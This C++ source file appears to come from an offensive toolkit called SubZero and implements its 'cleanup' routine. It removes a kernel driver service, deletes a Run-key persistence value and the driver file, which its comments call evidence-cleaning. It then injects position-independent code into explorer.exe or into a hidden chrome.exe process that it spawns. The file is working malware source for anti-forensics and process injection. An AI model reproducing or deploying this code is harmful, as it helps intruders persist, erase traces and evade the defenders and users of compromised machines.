#include "pch.h"
#include "SubZeroCleanup.h"
#include "PIC.h"
#include "PicInjection.h"

#include "../SubZeroDriver/SubZeroCommon.h"
#include "../SubZeroLauncher/SubZeroLauncherCommon.h"
#include "../SubZeroUtils/RegistryManager.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroUtils/RunningProcesses.h"
#include "../SubZeroUtils/AutoRegistryKeyHandle.h"

void SubZeroCleanup::Cleanup()
{
    // Uninstall SubZero driver if exists. 
    const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
    if (ERROR_SERVICE_DOES_NOT_EXIST != ::GetLastError())
    	
        // Driver is loaded - this function must succeed in order to continue. Any error here should be caught by the caller and handled accordingly.
        serviceManager.stopAndRemove();
	
    // Create a string stream that will log any exception. The final error log will only be thrown at the end of the function, in order to ensure every
    // evidence-cleaning function will be called - even in case of an error on the way.
    std::stringstream finalException("");

    // Delete registry value
    try {
        const AutoRegistryKeyHandle autoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
        RegistryManager::DeleteRegistryValue(autoRegKey.get(), REG_VALUE_NAME);
    }
    catch (const Win32ErrorCodeException& exception) {
        finalException << exception.what() << "\n";
    }

    // Delete driver file
    if (!::DeleteFileW(DRIVER_FULL_PATH.c_str()))
    {
        const int lastError = ::GetLastError();
        if (ERROR_FILE_NOT_FOUND != lastError)
            finalException << "[-] Error deleting driver file. Error code: " << lastError << "\n";
    }

    std::uint32_t targetPid;
    try
    {
        targetPid = GetProcessPidByProcessName(L"explorer.exe");
    }
    catch (...)
    {
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
    	
		// Creates a child chrome process that will be the PIC target
		if (!::CreateProcessW(
            (DIRECTORY_PATH + L"chrome.exe").c_str(),   // Module
            nullptr,					                // Command-line
		    nullptr,                                    // Process security attributes
		    nullptr,                                    // Primary thread security attributes
		    TRUE,						                // Handles are inherited
		    CREATE_NO_WINDOW,                           // Creation flags
		    nullptr,                                    // Environment (use parent)
		    nullptr,                                    // Current directory (use parent)
		    &si,                                        // STARTUPINFO pointer
		    &pi))                                       // PROCESS_INFORMATION pointer             
		{
			finalException << "[-] Error finding target PIC injection process\n";
            throw std::runtime_error(finalException.str());
		}

        targetPid = pi.dwProcessId;
    }
	
    // Setup PIC parameters
    PicParams picParams;
    picParams.getProcAddress = GetProcAddress;
    picParams.loadLibraryA = LoadLibraryA;
    picParams.pid = ::GetCurrentProcessId();

    if (nullptr == picParams.getProcAddress || nullptr == picParams.loadLibraryA)
        finalException << "[-] Invalid PIC parameters\n";
	
    else 
    {
        // Inject PIC
        try
        {
            PicInjection::InjectPic<PicParams>(targetPid, &picParams, PicStart, PicEnd);
        }
        catch (std::exception& exception)
        {
            finalException << exception.what() << "\n";
        }
    }

	// Throw full exception log if exist
    if (finalException.str().length() > 0)
        throw std::runtime_error(finalException.str());
}

std::uint32_t SubZeroCleanup::GetProcessPidByProcessName(const std::wstring& processName)
{
    RunningProcesses processes;
    for (const auto& process : processes)
    {
        std::wstring currentProcessName(process.szExeFile);

        if (processName == currentProcessName)
        {
            return process.th32ProcessID;
        }
    }

    throw std::runtime_error("Could not find target process PID");
}